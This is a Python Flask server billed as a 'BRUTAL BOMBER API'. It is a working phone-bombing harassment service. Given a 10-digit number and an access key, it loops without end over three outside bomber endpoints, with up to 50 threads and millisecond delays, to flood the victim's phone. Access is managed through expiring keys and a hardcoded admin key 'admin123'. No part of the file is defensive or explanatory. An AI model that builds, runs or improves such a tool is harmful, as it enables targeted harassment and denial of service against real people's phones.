from flask import Flask, request, jsonify
import requests
import time
import secrets
import threading
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# ====== KEY SYSTEM ======
DEFAULT_KEY = "admin123"
keys_db = {}

def generate_key(duration_hours=24):
    key = secrets.token_hex(16)
    created = datetime.now()
    expires = created + timedelta(hours=duration_hours)
    keys_db[key] = {
        "created": created.isoformat(),
        "expires": expires.isoformat(),
        "active": True
    }
    return key

def validate_key(key):
    if key == DEFAULT_KEY:
        return True
    if key not in keys_db:
        return False
    if not keys_db[key]["active"]:
        return False
    expires = datetime.fromisoformat(keys_db[key]["expires"])
    if datetime.now() > expires:
        keys_db[key]["active"] = False
        return False
    return True

# ====== 3 APIS ======
THREE_APIS = [
    {"name": "Ultra_Bomber", "url": "https://ultra-brutal-bomber.onrender.com/bomb", "params": {"phone": "{num}"}},
    {"name": "Part1_Bomber", "url": "https://bomber-part-1.onrender.com/bomb", "params": {"phone": "{num}"}},
    {"name": "Part2_Bomber", "url": "https://brutal-bomber-part-2.onrender.com/bomb", "params": {"phone": "{num}"}}
]

# ====== INFINITE BOMBER ENGINE ======
class InfiniteBomber:
    def __init__(self, phone, key, threads=50, delay=0.005):
        self.phone = phone
        self.key = key
        self.threads = threads
        self.delay = delay
        self.running = True
        self.success = 0
        self.failed = 0
        self.start_time = time.time()
    
    def _send_request(self, api):
        if not self.running:
            return False
        time.sleep(self.delay)
        try:
            params = api["params"].copy()
            for k, v in params.items():
                if "{num}" in v:
                    params[k] = v.replace("{num}", self.phone)
            resp = requests.get(api["url"], params=params, timeout=10)
            return resp.status_code == 200
        except:
            return False
    
    def start(self):
        self.running = True
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while self.running:
                futures = [executor.submit(self._send_request, api) for api in THREE_APIS * 2]
                for future in as_completed(futures):
                    if not self.running:
                        break
                    if future.result():
                        self.success += 1
                    else:
                        self.failed += 1
                
                elapsed = int(time.time() - self.start_time)
                rate = self.success / elapsed if elapsed > 0 else 0
                print(f"✅ {self.success} | ❌ {self.failed} | ⚡ {rate:.1f}/s")
    
    def stop(self):
        self.running = False
    
    def get_stats(self):
        elapsed = int(time.time() - self.start_time)
        return {
            "phone": self.phone,
            "success": self.success,
            "failed": self.failed,
            "total": self.success + self.failed,
            "time": elapsed,
            "speed": f"{self.success/elapsed:.1f}/s" if elapsed > 0 else "N/A"
        }

# ====== ACTIVE BOMBERS ======
active_bombers = {}

# ====== API ENDPOINTS ======

@app.route('/')
def home():
    return {
        "status": "🔥 BRUTAL BOMBER API 🔥",
        "version": "4.0",
        "apis": [api["name"] for api in THREE_APIS],
        "active_bombers": len(active_bombers),
        "endpoints": {
            "/bomb": "GET — phone, key (infinite loop)",
            "/stop": "GET — bomber_id",
            "/status": "GET — bomber_id",
            "/keygen": "POST — Generate key",
            "/health": "GET — Health check"
        }
    }

@app.route('/bomb', methods=['GET'])
def bomb():
    """Start infinite bombing — runs in background"""
    phone = request.args.get('phone')
    key = request.args.get('key')
    threads = int(request.args.get('threads', 50))
    delay = float(request.args.get('delay', 0.005))
    
    # Validate key
    if not key or not validate_key(key):
        return jsonify({"status": "error", "message": "Invalid or expired key"}), 401
    
    if not phone or len(phone) != 10 or not phone.isdigit():
        return jsonify({"status": "error", "message": "Phone number must be 10 digits"}), 400
    
    # Check if already running
    for bid, bomber in active_bombers.items():
        if bomber.phone == phone:
            return jsonify({
                "status": "error",
                "message": f"Bombing already running for {phone}",
                "bomber_id": bid
            }), 409
    
    # Create bomber
    bomber_id = f"{phone}_{int(time.time())}"
    bomber = InfiniteBomber(phone, key, threads, delay)
    active_bombers[bomber_id] = bomber
    
    # Start in background
    def run_bomber():
        bomber.start()
        if bomber_id in active_bombers:
            del active_bombers[bomber_id]
    
    threading.Thread(target=run_bomber).start()
    
    return jsonify({
        "status": "success",
        "message": "Infinite bombing started",
        "bomber_id": bomber_id,
        "phone": phone
    })

@app.route('/stop', methods=['GET'])
def stop():
    """Stop bombing by bomber_id"""
    bomber_id = request.args.get('bomber_id')
    
    if not bomber_id:
        return jsonify({"status": "error", "message": "bomber_id required"}), 400
    
    if bomber_id in active_bombers:
        active_bombers[bomber_id].stop()
        stats = active_bombers[bomber_id].get_stats()
        del active_bombers[bomber_id]
        return jsonify({
            "status": "success",
            "message": "Bombing stopped",
            "stats": stats
        })
    
    return jsonify({"status": "error", "message": "Bomber not found"}), 404

@app.route('/status', methods=['GET'])
def status():
    """Get bombing status"""
    bomber_id = request.args.get('bomber_id')
    
    if not bomber_id:
        return jsonify({
            "status": "error",
            "message": "bomber_id required",
            "active_bombers": list(active_bombers.keys())
        }), 400
    
    if bomber_id in active_bombers:
        stats = active_bombers[bomber_id].get_stats()
        return jsonify({
            "status": "running",
            "stats": stats
        })
    
    return jsonify({"status": "error", "message": "Bomber not found"}), 404

@app.route('/stop/all', methods=['GET'])
def stop_all():
    """Stop all bombing"""
    count = len(active_bombers)
    for bomber_id in list(active_bombers.keys()):
        active_bombers[bomber_id].stop()
        del active_bombers[bomber_id]
    
    return jsonify({
        "status": "success",
        "message": f"Stopped {count} bombers"
    })

@app.route('/keygen', methods=['POST'])
def keygen():
    data = request.get_json() or {}
    admin_key = data.get('admin_key')
    duration = int(data.get('duration', 24))
    
    if admin_key != DEFAULT_KEY:
        return jsonify({"status": "error", "message": "Invalid admin key"}), 401
    
    new_key = generate_key(duration)
    return jsonify({
        "status": "success",
        "key": new_key,
        "expires": keys_db[new_key]["expires"],
        "duration": f"{duration} hours"
    })

@app.route('/key/expire', methods=['POST'])
def expire():
    data = request.get_json() or {}
    admin_key = data.get('admin_key')
    key_to_expire = data.get('key')
    
    if admin_key != DEFAULT_KEY:
        return jsonify({"status": "error", "message": "Invalid admin key"}), 401
    
    if not key_to_expire:
        return jsonify({"status": "error", "message": "key required"}), 400
    
    if key_to_expire in keys_db:
        keys_db[key_to_expire]["active"] = False
        return jsonify({"status": "success", "message": f"Key {key_to_expire} expired"})
    
    return jsonify({"status": "error", "message": "Key not found"}), 404

@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "version": "4.0",
        "apis": len(THREE_APIS),
        "active_bombers": len(active_bombers),
        "active_keys": len([k for k, v in keys_db.items() if v["active"]]),
        "total_keys": len(keys_db)
    })

@app.route('/stats')
def stats():
    return jsonify({
        "total_apis": len(THREE_APIS),
        "apis": [api["name"] for api in THREE_APIS],
        "active_bombers": len(active_bombers),
        "active_keys": len([k for k, v in keys_db.items() if v["active"]]),
        "total_keys": len(keys_db)
    })

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
